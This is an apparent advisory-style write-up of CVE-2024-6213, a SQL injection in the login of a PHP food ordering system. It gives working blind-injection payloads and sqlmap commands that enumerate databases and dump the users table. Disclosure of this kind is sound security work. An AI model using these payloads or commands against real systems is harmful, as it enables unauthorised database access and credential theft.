
# SQL Injection vulnerability was discovered from Sourcecodester Food Ordering Management System 1.0 (login)
## CVE-2024-6213
Affected Project: Sourcecodester Food Ordering Management System 1.0
Official Website: https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html
Version: 1.0

Related Code file: router.php

Injection parameter: username


## Vulnerability Analysis

1. Lack of Input Validation and Sanitization:
The username and password fields are directly used in the SQL query without any sanitization or validation. This allows an attacker to manipulate the SQL query by injecting malicious SQL code.

2. Use of Plain SQL Queries:
The script likely uses plain SQL queries to interact with the database. Without prepared statements, this approach is highly vulnerable to SQL injection.

## Demonstraation

Below is the login.php:

`http://172.16.76.1/foms/login.php`

![image](https://github.com/jadu101/CVE/assets/76433661/5f48cb34-18a4-4b03-8848-964b87b60b94)

We will first intercept the login traffic using Burp Suite. Web app is using router.php for login:

![image-1](https://github.com/jadu101/CVE/assets/76433661/cf2eb00b-1072-4879-871d-fea55e0e27ee)

Save the intercepted login request to a .txt file and execute sqlmap towards it. 

parameter username is vulnerable to boolean-based blind sql injection

Below commands verifies the vulnerability:

`sqlmap -r foms_login_php.txt --batch`

![image-2](https://github.com/jadu101/CVE/assets/76433661/cefe36df-faac-4a01-add2-d8ea640290bd)

```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 7413=7413 AND 'DhRh'='DhRh&password=admin123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3140 FROM (SELECT(SLEEP(5)))KQvB) AND 'JGgH'='JGgH&password=admin123
---
```

Below commnd will list databases:

`sqlmap -r foms_login_php.txt --batch -p username --dbs`

![image-3](https://github.com/jadu101/CVE/assets/76433661/fe318b8c-e4cd-4110-bcf6-f2fe4b11ece3)


Below command will dump data inside foms_db database table users:

`sqlmap -r foms_login_php.txt --batch -p username --dbs -D foms_db -T users --dump`

![image-4](https://github.com/jadu101/CVE/assets/76433661/a9cb9cc8-14a4-4517-bb1b-7e0f27c15665)
